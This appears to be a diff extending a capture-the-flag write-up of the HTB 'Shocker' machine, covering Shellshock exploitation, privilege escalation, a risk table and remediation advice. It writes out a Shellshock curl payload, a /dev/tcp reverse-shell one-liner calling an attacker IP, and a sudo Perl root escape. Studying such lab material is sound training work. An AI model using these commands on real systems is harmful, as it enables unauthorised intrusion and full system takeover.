@@ -8,7 +8,7 @@
 
 ## 0. Lesson Learned
 
-Dirbuster's directory-2.3-medium.txt list is excessively long and may return false negatives. Use dirb/common.txt for initial web enumeration instead.
+Dirbuster's `directory-2.3-medium.txt` list is excessively long and may return false negatives. Use `dirb/common.txt` for initial web enumeration instead.
 
 ---
 
@@ -95,3 +95,97 @@ Shellshock is a critical vulnerability in Bash where crafted environment variabl
 
 ---
 
+## 7. Exploitation
+
+### Remote Command Execution
+
+The vulnerability was confirmed by injecting a malicious function definition via the `User-Agent` HTTP header:
+
+```
+curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "id"' http://10.129.12.199/cgi-bin/user.sh
+```
+
+The command executed successfully, returning user identity information and confirming arbitrary command execution.
+
+### Reverse Shell
+
+A `bash -i` reverse shell was established using the same attack vector:
+
+```
+curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "sh -i >& /dev/tcp/10.10.14.11/443 0>&1"' http://10.129.12.199/cgi-bin/user.sh
+```
+
+This provided an interactive shell as the user `shelly`.
+
+---
+
+## 8. Privilege Escalation
+
+### Sudo Misconfiguration
+
+Enumeration of sudo permissions revealed the execution of `/usr/bin/perl` as root without a password:
+
+```
+sudo -l
+```
+
+### Root Access
+
+Root access was obtained using:
+
+```
+sudo /usr/bin/perl -e 'exec "/bin/sh";'
+```
+
+Successful escalation was confirmed by verifying the effective user ID.
+
+---
+
+## 9. Post-Exploitation
+
+### User Flag - *REDACTED*
+
+```
+cat /home/shelly/user.txt
+```
+
+### Root Flag - *REDACTED*
+
+```
+cat /root/root.txt
+```
+
+---
+
+## 10. Risk Assessment
+
+| Vulnerability | Severity | Description | Result |
+|---------------|----------|-------------|--------|
+| Shellshock RCE (CVE-2014-6271) | Critical | Incorrect parsing of environmental variables in Bash allows attackers to execute remote code on affected systems | Initial foothold with low-privileged access |
+| Sudo misconfiguration | High | A misconfigured sudo permission allowed privilege escalation through execution of Perl as root without a password | Full system compromise as root |
+
+---
+
+## 11. Recommendations
+
+1. Remove or restrict CGI scripts where not required.
+2. Update Bash to a patched version.
+3. Disable execution permissions on web-accessible scripts.
+4. Audit sudo permissions and remove unnecessary NOPASSWD entries.
+5. Apply least-privilege principles to service accounts.
+
+---
+
+## 12. Conclusion
+
+The HTB Shocker host was fully compromised through a well-known but severe vulnerability in a CGI Bash script, compounded by insecure privilege escalation controls. Exploitation required no authentication and resulted in complete root access.
+
+---
+
+## 13. Appendix
+
+Resources used:
+
+[Testing Shellshock CVE-2014-6271](https://github.com/DrHaitham/CVE-2014-6271-Shellshock-?tab=readme-ov-file#4-exploiting-shellshock-with-curl)
+[`Bash -i` Reverse Shell](https://www.revshells.com/)
+[Perl Sudo Privesc Command](https://gtfobins.github.io/gtfobins/perl/#sudo)
